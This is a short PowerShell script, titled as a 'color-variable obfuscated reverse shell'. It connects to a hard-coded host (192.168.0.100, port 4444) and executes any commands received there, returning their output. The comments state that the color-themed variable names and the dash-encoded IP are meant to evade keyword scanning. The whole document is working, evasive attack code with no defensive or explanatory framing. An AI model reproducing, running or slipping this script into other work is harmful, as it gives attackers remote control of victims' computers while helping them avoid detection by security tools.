# Color-Variable Obfuscated Reverse Shell
# Uses color-themed variable names and dash-encoded IP to evade keyword scanning

$crimson = "192-168-0-100_4444"
$crimson = $crimson -replace '-', '.'

$scarlet = $crimson.LastIndexOf('_')
$ivory = $crimson.Substring(0, $scarlet)
$slate = [int]$crimson.Substring($scarlet + 1)

try {
    $cobalt = New-Object System.Net.Sockets.TcpClient($ivory, $slate)
    $amber = $cobalt.GetStream()
    $pearl = New-Object IO.StreamWriter($amber)
    $pearl.AutoFlush = $true
    $onyx = New-Object IO.StreamReader($amber)

    $pearl.WriteLine("Windows PowerShell`nCopyright (C) Microsoft Corporation.`n")
    $pearl.Write((Get-Location).Path + '> ')

    while ($cobalt.Connected) {
        $coral = $onyx.ReadLine()
        if ($coral) {
            try {
                $ruby = Invoke-Expression $coral 2>&1 | Out-String
                $pearl.WriteLine($ruby)
                $pearl.Write((Get-Location).Path + '> ')
            } catch {
                $pearl.WriteLine("Error: $_")
                $pearl.Write((Get-Location).Path + '> ')
            }
        }
    }
} catch { exit }
finally { if ($cobalt) { $cobalt.Close() } }
